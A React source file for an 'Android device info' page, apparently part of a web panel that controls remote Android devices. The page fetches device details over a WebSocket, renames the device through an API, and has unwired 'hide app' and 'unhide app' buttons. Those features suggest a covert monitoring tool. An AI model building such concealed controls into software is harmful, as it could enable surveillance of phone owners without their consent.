import { useState, useEffect, useCallback, useContext, useRef } from "react";
import "./AndroidInfoPage.css";
import ChangeConnectionDialog from "./androidInfo/ChangeConnectionDialog";
import ChangeDeviceNameDialog from "./androidInfo/ChangeDeviceNameDialog";
import { Context } from "../../../../context/context";
import { useParams } from "react-router";
import { useDevice } from "../../../../context/DeviceContext";
import {
  sendWebSocketMessage,
  WebSocketContext,
} from "../../../../context/WebSocketProvider";
import Loading from "../../../../components/loader/Loading";
import axios from "axios";
import { http } from "../../../../serverConfig.json";
const AndroidInfoPage = () => {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [isChangeConnectionDialogOpen, setChangeConnectionDialogOpen] =
    useState(false);
  const [isChangeNameDialogOpen, setChangeNameDialogOpen] = useState(false);

  const { id: deviceId } = useParams();
  const { state, dispatch } = useDevice();
  const { socketRef } = useContext(WebSocketContext);
  const context = useContext(Context);
  const language = context?.selectedLang;

  const deviceInfo = state?.deviceInfo || null;
  const timeoutRef = useRef(null);

  const sendDeviceInfoWS = useCallback(
    ({ action }) => {
      if (!socketRef?.current) return;
      setLoading(true);
      setError(null);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
      timeoutRef.current = setTimeout(() => {
        setLoading(false);
        setError(
          language?.devices?.timeout_error ||
            "No response from server. Please try again."
        );
      }, 20000);
      const msg = {
        token: localStorage.getItem("token"),
        uuid: deviceId,
        information_operation: true,
      };
      sendWebSocketMessage(socketRef.current, msg);
    },
    [socketRef, deviceId, language]
  );

  useEffect(() => {
    dispatch({ type: "SET_DEVICE_INFORMATION", payload: {} });
    sendDeviceInfoWS({ action: "get" });
    return () => {
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, [deviceId, sendDeviceInfoWS, dispatch]);

  useEffect(() => {
    if (state?.deviceInfo && Object.keys(state.deviceInfo).length > 0) {
      setLoading(false);
      setError(null);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    }
  }, [state?.deviceInfo]);

  const handleReload = () => {
    sendDeviceInfoWS({ action: "get" });
  };

  const handleChangeName = () => {
    setChangeNameDialogOpen(true);
  };

  const handleChangeConnection = () => {
    setChangeConnectionDialogOpen(true);
  };
  const changeName = async (name) => {
    try {
      const response = await axios.patch(
        `${http}/api/devices/${deviceId}/`,
        {
          name: name,
        },
        {
          headers: {
            Authorization: `Bearer ${localStorage.getItem("token")}`,
          },
        }
      );
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <div className="container">
      <h1 className="title">{language?.devices?.android_device_info}</h1>

      {loading ? (
        <Loading />
      ) : error ? (
        <p className="error">{error}</p>
      ) : deviceInfo && typeof deviceInfo === "object" ? (
        <ul className="list">
          {Object.entries(deviceInfo).map(([key, value], index) => (
            <li key={key} className="listItem">
              <strong>
                {language?.devices?.deviceInfo[index] ??
                  key.replace(/_/g, " ").toUpperCase() + ":"}
              </strong>{" "}
              {value ?? "Not Available"}
            </li>
          ))}
        </ul>
      ) : (
        <p className="empty">{language?.devices?.no_info_available}</p>
      )}

      <button className="btn" onClick={handleReload} disabled={loading}>
        {loading ? language?.devices?.reloading : language?.devices?.reload}
      </button>

      <button className="btn" onClick={handleChangeName}>
        {language?.devices?.change_name}
      </button>

      <div className="buttonRow">
        <button className="btn hide">{language?.devices?.hide_app}</button>
        <button className="btn unhide">{language?.devices?.unhide_app}</button>
        <button className="btn change" onClick={handleChangeConnection}>
          {language?.devices?.change_connction}
        </button>
      </div>

      <ChangeConnectionDialog
        isOpen={isChangeConnectionDialogOpen}
        onClose={() => setChangeConnectionDialogOpen(false)}
      />

      <ChangeDeviceNameDialog
        isOpen={isChangeNameDialogOpen}
        currentName={deviceInfo?.device_name || ""}
        onClose={() => setChangeNameDialogOpen(false)}
        onSave={changeName}
      />
    </div>
  );
};

export default AndroidInfoPage;
